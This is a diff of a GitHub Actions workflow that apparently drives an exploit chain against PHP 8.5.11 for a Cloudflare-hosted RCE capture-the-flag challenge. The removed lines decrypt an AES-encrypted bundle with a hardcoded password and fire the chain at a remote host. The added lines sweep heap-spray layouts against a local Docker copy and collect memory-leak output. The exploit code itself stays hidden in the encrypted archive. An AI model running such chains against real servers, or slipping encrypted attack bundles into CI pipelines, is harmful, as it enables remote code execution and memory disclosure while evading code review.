@@ -19,13 +19,27 @@ jobs:
     timeout-minutes: 10
     steps:
       - uses: actions/checkout@v4
-      - name: Run Cloudflare PHP CTF chain
+      - name: Sweep PHP 8.5.11 heap layouts
         run: |
           openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -in cloudflare-ctf.enc -out /tmp/cloudflare-ctf.tar.gz -pass pass:cloudflare-ctf-run
           tar -C /tmp -xzf /tmp/cloudflare-ctf.tar.gz
-          cd /tmp/cf-action-bundle
+          cd /tmp/cf-layout-bundle
+          mkdir -p /tmp/cloudflare-php-ctf /tmp/layout-variants
+          python build_layout_variants.py b1-all-windows-20000-files160.bin /tmp/layout-variants >/tmp/layout-build.log
+          docker build -t cf-php-layout -f Dockerfile.local .
           set +e
-          python affine_chain_8511.py --target https://php-rce.cloudflare.app --endpoint /php/index.php --verify --warmup warmup.bin --a1 a1-physical-pages-2.bin --b1 b1-fullspray-p8-12000-files160.bin --query-order 1234 --leak-length 0x12000 --pipeline-pairs --b1-attempts 5 --b2-attempts 5 > /tmp/cloudflare-proof.log 2>&1
-          status=$?
-          cat /tmp/cloudflare-proof.log
-          exit "$status"
+          for payload in /tmp/layout-variants/*.bin; do
+            name=$(basename "$payload" .bin)
+            docker rm -f cf-php-layout-run >/dev/null 2>&1
+            docker run -d --name cf-php-layout-run -p 18087:80 cf-php-layout >/dev/null
+            until curl -fsS http://127.0.0.1:18087/index.php >/dev/null; do sleep 0.1; done
+            rm -f /tmp/cloudflare-php-ctf/affine-leak.bin
+            python affine_chain_8511.py --target http://127.0.0.1:18087 --endpoint /index.php --warmup warmup.bin --a1 a1-physical-pages-2.bin --b1 "$payload" --query-order 1234 --leak-length 0x20000 --pipeline-pairs --leak-only >/tmp/layout-run.log 2>&1
+            status=$?
+            echo "LAYOUT=$name STATUS=$status"
+            sed -n '/^A1 /p;/^B1 /p' /tmp/layout-run.log
+            if test -s /tmp/cloudflare-php-ctf/affine-leak.bin; then
+              python summarize_layout.py /tmp/cloudflare-php-ctf/affine-leak.bin
+            fi
+          done
+          docker rm -f cf-php-layout-run >/dev/null 2>&1
